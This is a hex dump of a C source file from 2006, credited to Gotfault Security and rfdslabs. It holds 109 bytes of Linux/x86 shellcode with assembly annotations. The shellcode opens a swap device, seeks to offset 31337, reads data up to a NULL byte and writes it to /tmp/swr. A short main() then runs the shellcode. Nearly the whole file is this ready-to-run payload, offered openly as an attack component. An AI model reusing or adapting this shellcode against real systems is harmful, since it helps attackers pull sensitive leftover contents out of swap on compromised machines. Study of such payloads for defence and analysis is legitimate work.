00000000  2f 2a 0d 0a 20 2a 20 6c  69 6e 75 78 2d 78 38 36  |/*.. * linux-x86|
00000010  2d 73 77 61 70 2d 72 65  73 74 6f 72 65 2e 63 20  |-swap-restore.c |
00000020  2d 20 53 57 41 50 20 72  65 73 74 6f 72 65 20 73  |- SWAP restore s|
00000030  68 65 6c 6c 63 6f 64 65  20 31 30 39 20 62 79 74  |hellcode 109 byt|
00000040  65 73 20 66 6f 72 20 4c  69 6e 75 78 2f 78 38 36  |es for Linux/x86|
00000050  0d 0a 20 2a 20 43 6f 70  79 72 69 67 68 74 20 28  |.. * Copyright (|
00000060  63 29 20 32 30 30 36 20  47 6f 74 66 61 75 6c 74  |c) 2006 Gotfault|
00000070  20 53 65 63 75 72 69 74  79 20 26 20 72 66 64 73  | Security & rfds|
00000080  6c 61 62 73 0d 0a 20 2a  0d 0a 20 2a 20 41 75 74  |labs.. *.. * Aut|
00000090  68 6f 72 73 3a 0d 0a 20  2a 0d 0a 20 2a 20 20 20  |hors:.. *.. *   |
000000a0  20 20 20 64 78 20 20 20  20 20 20 3c 78 67 63 40  |   dx      <xgc@|
000000b0  67 6f 74 66 61 75 6c 74  2e 6e 65 74 3e 0d 0a 20  |gotfault.net>.. |
000000c0  2a 20 20 20 20 20 20 73  70 75 64 20 20 20 20 3c  |*      spud    <|
000000d0  67 75 73 74 61 76 6f 40  72 66 64 73 6c 61 62 73  |gustavo@rfdslabs|
000000e0  2e 63 6f 6d 2e 62 72 3e  0d 0a 20 2a 0d 0a 20 2a  |.com.br>.. *.. *|
000000f0  20 54 68 69 73 20 73 68  65 6c 6c 63 6f 64 65 20  | This shellcode |
00000100  72 65 61 64 73 20 74 68  65 20 73 77 61 70 20 64  |reads the swap d|
00000110  65 76 69 63 65 20 61 74  20 6f 66 66 73 65 74 20  |evice at offset |
00000120  33 31 33 33 37 2e 20 41  66 74 65 72 20 69 74 20  |31337. After it |
00000130  73 65 61 72 63 68 73 20  62 79 0d 0a 20 2a 20 4e  |searchs by.. * N|
00000140  55 4c 4c 20 62 79 74 65  2c 20 69 74 20 73 74 6f  |ULL byte, it sto|
00000150  70 73 20 61 6e 64 20 77  72 69 74 65 20 74 68 65  |ps and write the|
00000160  20 72 65 61 64 65 64 20  63 6f 6e 74 65 6e 74 20  | readed content |
00000170  74 6f 20 27 2f 74 6d 70  2f 73 77 72 27 20 66 69  |to '/tmp/swr' fi|
00000180  6c 65 2e 0d 0a 20 2a 20  50 72 6f 62 61 6c 79 20  |le... * Probaly |
00000190  79 6f 75 20 6e 65 65 64  73 20 74 6f 20 63 68 61  |you needs to cha|
000001a0  6e 67 65 20 74 68 65 20  64 65 76 69 63 65 20 70  |nge the device p|
000001b0  61 74 68 20 6e 61 6d 65  20 69 6e 20 6f 70 65 6e  |ath name in open|
000001c0  28 29 20 64 65 76 69 63  65 20 73 79 73 63 61 6c  |() device syscal|
000001d0  6c 2e 0d 0a 20 2a 0d 0a  20 2a 2f 0d 0a 0d 0a 63  |l... *.. */....c|
000001e0  68 61 72 20 73 68 65 6c  6c 63 6f 64 65 5b 5d 20  |har shellcode[] |
000001f0  3d 0d 0a 0d 0a 20 20 2f  2a 20 6f 70 65 6e 28 64  |=....  /* open(d|
00000200  65 76 69 63 65 2c 20 4f  5f 52 44 4f 4e 4c 59 29  |evice, O_RDONLY)|
00000210  20 2a 2f 0d 0a 0d 0a 20  20 22 5c 78 36 61 5c 78  | */....  "\x6a\x|
00000220  30 35 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |05"             |
00000230  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 20  |       // push  |
00000240  20 24 30 78 35 0d 0a 20  20 22 5c 78 35 38 22 20  | $0x5..  "\x58" |
00000250  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000260  20 20 20 20 20 20 20 2f  2f 20 70 6f 70 20 20 20  |       // pop   |
00000270  20 25 65 61 78 0d 0a 20  20 22 5c 78 39 39 22 20  | %eax..  "\x99" |
00000280  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000290  20 20 20 20 20 20 20 2f  2f 20 63 6c 74 64 20 20  |       // cltd  |
000002a0  20 0d 0a 20 20 22 5c 78  35 32 22 20 20 20 20 20  | ..  "\x52"     |
000002b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002c0  20 20 20 2f 2f 20 70 75  73 68 20 20 20 25 65 64  |   // push   %ed|
000002d0  78 0d 0a 20 20 22 5c 78  36 38 5c 78 37 33 5c 78  |x..  "\x68\x73\x|
000002e0  36 34 5c 78 36 31 5c 78  33 31 22 20 20 20 20 20  |64\x61\x31"     |
000002f0  20 20 20 2f 2f 20 70 75  73 68 20 20 20 24 30 78  |   // push   $0x|
00000300  33 31 36 31 36 34 37 33  0d 0a 20 20 22 5c 78 36  |31616473..  "\x6|
00000310  38 5c 78 36 34 5c 78 36  35 5c 78 37 36 5c 78 32  |8\x64\x65\x76\x2|
00000320  66 22 20 20 20 20 20 20  20 20 2f 2f 20 70 75 73  |f"        // pus|
00000330  68 20 20 20 24 30 78 32  66 37 36 36 35 36 34 0d  |h   $0x2f766564.|
00000340  0a 20 20 22 5c 78 36 36  5c 78 36 38 5c 78 32 66  |.  "\x66\x68\x2f|
00000350  5c 78 32 66 22 20 20 20  20 20 20 20 20 20 20 20  |\x2f"           |
00000360  20 2f 2f 20 70 75 73 68  77 20 20 24 30 78 32 66  | // pushw  $0x2f|
00000370  32 66 0d 0a 20 20 22 5c  78 38 39 5c 78 65 33 22  |2f..  "\x89\xe3"|
00000380  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000390  20 20 20 20 2f 2f 20 6d  6f 76 20 20 20 20 25 65  |    // mov    %e|
000003a0  73 70 2c 25 65 62 78 0d  0a 20 20 22 5c 78 35 32  |sp,%ebx..  "\x52|
000003b0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
000003c0  20 20 20 20 20 20 20 20  20 2f 2f 20 70 75 73 68  |         // push|
000003d0  20 20 20 25 65 64 78 0d  0a 20 20 22 5c 78 35 39  |   %edx..  "\x59|
000003e0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
000003f0  20 20 20 20 20 20 20 20  20 2f 2f 20 70 6f 70 20  |         // pop |
00000400  20 20 20 25 65 63 78 0d  0a 20 20 22 5c 78 63 64  |   %ecx..  "\xcd|
00000410  5c 78 38 30 22 20 20 20  20 20 20 20 20 20 20 20  |\x80"           |
00000420  20 20 20 20 20 20 20 20  20 2f 2f 20 69 6e 74 20  |         // int |
00000430  20 20 20 24 30 78 38 30  0d 0a 0d 0a 20 20 22 5c  |   $0x80....  "\|
00000440  78 39 33 22 20 20 20 20  20 20 20 20 20 20 20 20  |x93"            |
00000450  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 78  |            // x|
00000460  63 68 67 20 20 20 25 65  61 78 2c 25 65 62 78 0d  |chg   %eax,%ebx.|
00000470  0a 0d 0a 20 20 2f 2a 20  6c 73 65 65 6b 28 66 64  |...  /* lseek(fd|
00000480  5f 64 65 76 69 63 65 2c  20 33 31 33 33 37 2c 20  |_device, 31337, |
00000490  53 45 45 4b 5f 53 45 54  29 20 2a 2f 0d 0a 0d 0a  |SEEK_SET) */....|
000004a0  20 20 22 5c 78 33 31 5c  78 63 39 22 20 20 20 20  |  "\x31\xc9"    |
000004b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004c0  2f 2f 20 78 6f 72 20 20  20 20 25 65 63 78 2c 25  |// xor    %ecx,%|
000004d0  65 63 78 0d 0a 20 20 22  5c 78 36 61 5c 78 31 33  |ecx..  "\x6a\x13|
000004e0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
000004f0  20 20 20 20 20 2f 2f 20  70 75 73 68 20 20 20 24  |     // push   $|
00000500  30 78 31 33 0d 0a 20 20  22 5c 78 35 38 22 20 20  |0x13..  "\x58"  |
00000510  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000520  20 20 20 20 20 20 2f 2f  20 70 6f 70 20 20 20 20  |      // pop    |
00000530  25 65 61 78 0d 0a 20 20  22 5c 78 36 36 5c 78 62  |%eax..  "\x66\xb|
00000540  39 5c 78 36 39 5c 78 37  61 22 20 20 20 20 20 20  |9\x69\x7a"      |
00000550  20 20 20 20 20 20 2f 2f  20 6d 6f 76 20 20 20 20  |      // mov    |
00000560  24 30 78 37 61 36 39 2c  25 63 78 0d 0a 20 20 22  |$0x7a69,%cx..  "|
00000570  5c 78 63 64 5c 78 38 30  22 20 20 20 20 20 20 20  |\xcd\x80"       |
00000580  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000590  69 6e 74 20 20 20 20 24  30 78 38 30 0d 0a 0d 0a  |int    $0x80....|
000005a0  20 20 2f 2a 20 72 65 61  64 28 66 64 5f 64 65 76  |  /* read(fd_dev|
000005b0  69 63 65 2c 20 2a 62 75  66 2c 20 31 30 32 35 29  |ice, *buf, 1025)|
000005c0  20 2a 2f 0d 0a 0d 0a 20  20 22 5c 78 38 39 5c 78  | */....  "\x89\x|
000005d0  65 31 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |e1"             |
000005e0  20 20 20 20 20 20 20 2f  2f 20 6d 6f 76 20 20 20  |       // mov   |
000005f0  20 25 65 73 70 2c 25 65  63 78 0d 0a 20 20 22 5c  | %esp,%ecx..  "\|
00000600  78 34 32 22 20 20 20 20  20 20 20 20 20 20 20 20  |x42"            |
00000610  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 69  |            // i|
00000620  6e 63 20 20 20 20 25 65  64 78 0d 0a 20 20 22 5c  |nc    %edx..  "\|
00000630  78 63 31 5c 78 65 32 5c  78 30 61 22 20 20 20 20  |xc1\xe2\x0a"    |
00000640  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 73  |            // s|
00000650  68 6c 20 20 20 20 24 30  78 61 2c 25 65 64 78 0d  |hl    $0xa,%edx.|
00000660  0a 20 20 22 5c 78 34 32  22 20 20 20 20 20 20 20  |.  "\x42"       |
00000670  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000680  20 2f 2f 20 69 6e 63 20  20 20 20 25 65 64 78 0d  | // inc    %edx.|
00000690  0a 20 20 22 5c 78 36 61  5c 78 30 33 22 20 20 20  |.  "\x6a\x03"   |
000006a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006b0  20 2f 2f 20 70 75 73 68  20 20 20 24 30 78 33 0d  | // push   $0x3.|
000006c0  0a 20 20 22 5c 78 35 38  22 20 20 20 20 20 20 20  |.  "\x58"       |
000006d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006e0  20 2f 2f 20 70 6f 70 20  20 20 20 25 65 61 78 0d  | // pop    %eax.|
000006f0  0a 20 20 22 5c 78 63 64  5c 78 38 30 22 20 20 20  |.  "\xcd\x80"   |
00000700  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000710  20 2f 2f 20 69 6e 74 20  20 20 20 24 30 78 38 30  | // int    $0x80|
00000720  0d 0a 0d 0a 20 20 22 5c  78 38 39 5c 78 65 36 22  |....  "\x89\xe6"|
00000730  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000740  20 20 20 20 2f 2f 20 6d  6f 76 20 20 20 20 25 65  |    // mov    %e|
00000750  73 70 2c 25 65 73 69 0d  0a 20 20 22 5c 78 39 39  |sp,%esi..  "\x99|
00000760  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000770  20 20 20 20 20 20 20 20  20 2f 2f 20 63 6c 74 64  |         // cltd|
00000780  20 20 20 0d 0a 20 20 22  5c 78 33 31 5c 78 66 66  |   ..  "\x31\xff|
00000790  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
000007a0  20 20 20 20 20 2f 2f 20  78 6f 72 20 20 20 20 25  |     // xor    %|
000007b0  65 64 69 2c 25 65 64 69  0d 0a 0d 0a 20 20 2f 2a  |edi,%edi....  /*|
000007c0  20 63 6f 75 6e 74 65 72  20 6c 6f 6f 70 20 2d 20  | counter loop - |
000007d0  72 65 61 64 20 65 61 63  68 20 62 79 74 65 20 61  |read each byte a|
000007e0  6e 64 20 73 65 61 72 63  68 73 20 62 79 20 30 78  |nd searchs by 0x|
000007f0  30 2e 20 2a 2f 0d 0a 0d  0a 20 20 22 5c 78 61 63  |0. */....  "\xac|
00000800  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000810  20 20 20 20 20 20 20 20  20 2f 2f 20 6c 6f 64 73  |         // lods|
00000820  20 20 20 25 64 73 0d 0a  20 20 22 5c 78 33 38 5c  |   %ds..  "\x38\|
00000830  78 64 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |xd0"            |
00000840  20 20 20 20 20 20 20 20  2f 2f 20 63 6d 70 20 20  |        // cmp  |
00000850  20 20 25 64 6c 2c 25 61  6c 0d 0a 20 20 22 5c 78  |  %dl,%al..  "\x|
00000860  37 34 5c 78 30 34 22 20  20 20 20 20 20 20 20 20  |74\x04"         |
00000870  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 6a 65  |           // je|
00000880  20 20 20 20 20 38 30 34  38 30 62 33 20 3c 63 6c  |     80480b3 <cl|
00000890  6f 73 65 5f 64 65 76 69  63 65 3e 0d 0a 20 20 22  |ose_device>..  "|
000008a0  5c 78 34 37 22 20 20 20  20 20 20 20 20 20 20 20  |\x47"           |
000008b0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000008c0  69 6e 63 20 20 20 20 25  65 64 69 0d 0a 20 20 22  |inc    %edi..  "|
000008d0  5c 78 65 62 5c 78 66 38  22 20 20 20 20 20 20 20  |\xeb\xf8"       |
000008e0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000008f0  6a 6d 70 20 20 20 20 38  30 34 38 30 61 61 20 3c  |jmp    80480aa <|
00000900  63 6f 75 6e 74 65 72 3e  0d 0a 0d 0a 20 20 22 5c  |counter>....  "\|
00000910  78 39 31 22 20 20 20 20  20 20 20 20 20 20 20 20  |x91"            |
00000920  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 78  |            // x|
00000930  63 68 67 20 20 20 25 65  61 78 2c 25 65 63 78 0d  |chg   %eax,%ecx.|
00000940  0a 0d 0a 20 20 2f 2a 20  63 6c 6f 73 65 28 66 64  |...  /* close(fd|
00000950  5f 64 65 76 69 63 65 29  20 2a 2f 0d 0a 0d 0a 20  |_device) */.... |
00000960  20 22 5c 78 36 61 5c 78  30 36 22 20 20 20 20 20  | "\x6a\x06"     |
00000970  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000980  2f 20 70 75 73 68 20 20  20 24 30 78 36 0d 0a 20  |/ push   $0x6.. |
00000990  20 22 5c 78 35 38 22 20  20 20 20 20 20 20 20 20  | "\x58"         |
000009a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
000009b0  2f 20 70 6f 70 20 20 20  20 25 65 61 78 0d 0a 20  |/ pop    %eax.. |
000009c0  20 22 5c 78 63 64 5c 78  38 30 22 20 20 20 20 20  | "\xcd\x80"     |
000009d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
000009e0  2f 20 69 6e 74 20 20 20  20 24 30 78 38 30 0d 0a  |/ int    $0x80..|
000009f0  20 20 22 5c 78 38 39 5c  78 65 36 22 20 20 20 20  |  "\x89\xe6"    |
00000a00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a10  2f 2f 20 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |// mov    %esp,%|
00000a20  65 73 69 0d 0a 0d 0a 20  20 2f 2a 20 6f 70 65 6e  |esi....  /* open|
00000a30  28 22 2f 74 6d 70 2f 73  77 72 22 2c 20 4f 5f 43  |("/tmp/swr", O_C|
00000a40  52 45 41 54 7c 4f 5f 41  50 50 45 4e 44 7c 4f 5f  |REAT|O_APPEND|O_|
00000a50  57 52 4f 4e 4c 59 29 20  2a 2f 0d 0a 0d 0a 20 20  |WRONLY) */....  |
00000a60  22 5c 78 36 36 5c 78 62  39 5c 78 34 31 5c 78 30  |"\x66\xb9\x41\x0|
00000a70  34 22 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |4"            //|
00000a80  20 6d 6f 76 20 20 20 20  24 30 78 34 34 31 2c 25  | mov    $0x441,%|
00000a90  63 78 0d 0a 20 20 22 5c  78 35 32 22 20 20 20 20  |cx..  "\x52"    |
00000aa0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000ab0  20 20 20 20 2f 2f 20 70  75 73 68 20 20 20 25 65  |    // push   %e|
00000ac0  64 78 0d 0a 20 20 22 5c  78 36 38 5c 78 32 66 5c  |dx..  "\x68\x2f\|
00000ad0  78 37 33 5c 78 37 37 5c  78 37 32 22 20 20 20 20  |x73\x77\x72"    |
00000ae0  20 20 20 20 2f 2f 20 70  75 73 68 20 20 20 24 30  |    // push   $0|
00000af0  78 37 32 37 37 37 33 32  66 0d 0a 20 20 22 5c 78  |x7277732f..  "\x|
00000b00  36 38 5c 78 32 66 5c 78  37 34 5c 78 36 64 5c 78  |68\x2f\x74\x6d\x|
00000b10  37 30 22 20 20 20 20 20  20 20 20 2f 2f 20 70 75  |70"        // pu|
00000b20  73 68 20 20 20 24 30 78  37 30 36 64 37 34 32 66  |sh   $0x706d742f|
00000b30  0d 0a 20 20 22 5c 78 38  39 5c 78 65 33 22 20 20  |..  "\x89\xe3"  |
00000b40  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000b50  20 20 2f 2f 20 6d 6f 76  20 20 20 20 25 65 73 70  |  // mov    %esp|
00000b60  2c 25 65 62 78 0d 0a 20  20 22 5c 78 62 30 5c 78  |,%ebx..  "\xb0\x|
00000b70  30 35 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |05"             |
00000b80  20 20 20 20 20 20 20 2f  2f 20 6d 6f 76 20 20 20  |       // mov   |
00000b90  20 24 30 78 35 2c 25 61  6c 0d 0a 20 20 22 5c 78  | $0x5,%al..  "\x|
00000ba0  63 64 5c 78 38 30 22 20  20 20 20 20 20 20 20 20  |cd\x80"         |
00000bb0  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 69 6e  |           // in|
00000bc0  74 20 20 20 20 24 30 78  38 30 0d 0a 0d 0a 20 20  |t    $0x80....  |
00000bd0  22 5c 78 39 33 22 20 20  20 20 20 20 20 20 20 20  |"\x93"          |
00000be0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000bf0  20 78 63 68 67 20 20 20  25 65 61 78 2c 25 65 62  | xchg   %eax,%eb|
00000c00  78 0d 0a 0d 0a 20 20 2f  2a 20 77 72 69 74 65 28  |x....  /* write(|
00000c10  66 64 5f 66 69 6c 65 6e  61 6d 65 2c 20 2a 62 75  |fd_filename, *bu|
00000c20  66 2c 20 73 69 7a 65 6f  66 28 62 75 66 66 65 72  |f, sizeof(buffer|
00000c30  29 29 20 2a 2f 0d 0a 0d  0a 20 20 22 5c 78 36 61  |)) */....  "\x6a|
00000c40  5c 78 30 34 22 20 20 20  20 20 20 20 20 20 20 20  |\x04"           |
00000c50  20 20 20 20 20 20 20 20  20 2f 2f 20 70 75 73 68  |         // push|
00000c60  20 20 20 24 30 78 34 0d  0a 20 20 22 5c 78 35 38  |   $0x4..  "\x58|
00000c70  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000c80  20 20 20 20 20 20 20 20  20 2f 2f 20 70 6f 70 20  |         // pop |
00000c90  20 20 20 25 65 61 78 0d  0a 20 20 22 5c 78 35 36  |   %eax..  "\x56|
00000ca0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000cb0  20 20 20 20 20 20 20 20  20 2f 2f 20 70 75 73 68  |         // push|
00000cc0  20 20 20 25 65 73 69 0d  0a 20 20 22 5c 78 35 39  |   %esi..  "\x59|
00000cd0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000ce0  20 20 20 20 20 20 20 20  20 2f 2f 20 70 6f 70 20  |         // pop |
00000cf0  20 20 20 25 65 63 78 0d  0a 20 20 22 5c 78 38 39  |   %ecx..  "\x89|
00000d00  5c 78 66 61 22 20 20 20  20 20 20 20 20 20 20 20  |\xfa"           |
00000d10  20 20 20 20 20 20 20 20  20 2f 2f 20 6d 6f 76 20  |         // mov |
00000d20  20 20 20 25 65 64 69 2c  25 65 64 78 0d 0a 20 20  |   %edi,%edx..  |
00000d30  22 5c 78 63 64 5c 78 38  30 22 20 20 20 20 20 20  |"\xcd\x80"      |
00000d40  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000d50  20 69 6e 74 20 20 20 20  24 30 78 38 30 0d 0a 0d  | int    $0x80...|
00000d60  0a 20 20 2f 2a 20 63 6c  6f 73 65 28 66 64 5f 66  |.  /* close(fd_f|
00000d70  69 6c 65 6e 61 6d 65 29  20 2a 2f 0d 0a 0d 0a 20  |ilename) */.... |
00000d80  20 22 5c 78 62 30 5c 78  30 36 22 20 20 20 20 20  | "\xb0\x06"     |
00000d90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000da0  2f 20 6d 6f 76 20 20 20  20 24 30 78 36 2c 25 61  |/ mov    $0x6,%a|
00000db0  6c 0d 0a 20 20 22 5c 78  63 64 5c 78 38 30 22 20  |l..  "\xcd\x80" |
00000dc0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000dd0  20 20 20 2f 2f 20 69 6e  74 20 20 20 20 24 30 78  |   // int    $0x|
00000de0  38 30 0d 0a 0d 0a 20 20  2f 2a 20 65 78 69 74 28  |80....  /* exit(|
00000df0  61 6e 79 74 68 69 6e 67  29 20 2a 2f 0d 0a 0d 0a  |anything) */....|
00000e00  20 20 22 5c 78 62 30 5c  78 30 31 22 20 20 20 20  |  "\xb0\x01"    |
00000e10  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000e20  2f 2f 20 6d 6f 76 20 20  20 20 24 30 78 31 2c 25  |// mov    $0x1,%|
00000e30  61 6c 0d 0a 20 20 22 5c  78 63 64 5c 78 38 30 22  |al..  "\xcd\x80"|
00000e40  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000e50  20 20 20 20 2f 2f 20 69  6e 74 20 20 20 20 24 30  |    // int    $0|
00000e60  78 38 30 0d 0a 3b 0d 0a  0d 0a 69 6e 74 20 6d 61  |x80..;....int ma|
00000e70  69 6e 28 29 20 7b 0d 0a  20 0d 0a 20 20 20 20 20  |in() {.. ..     |
00000e80  20 20 20 69 6e 74 20 28  2a 66 29 28 29 20 3d 20  |   int (*f)() = |
00000e90  28 69 6e 74 28 2a 29 28  29 29 73 68 65 6c 6c 63  |(int(*)())shellc|
00000ea0  6f 64 65 3b 0d 0a 20 20  20 20 20 20 20 20 70 72  |ode;..        pr|
00000eb0  69 6e 74 66 28 22 4c 65  6e 67 74 68 3a 20 25 75  |intf("Length: %u|
00000ec0  5c 6e 22 2c 20 73 74 72  6c 65 6e 28 73 68 65 6c  |\n", strlen(shel|
00000ed0  6c 63 6f 64 65 29 29 3b  0d 0a 20 20 20 20 20 20  |lcode));..      |
00000ee0  20 20 66 28 29 3b 0d 0a  7d                       |  f();..}|
00000ee9
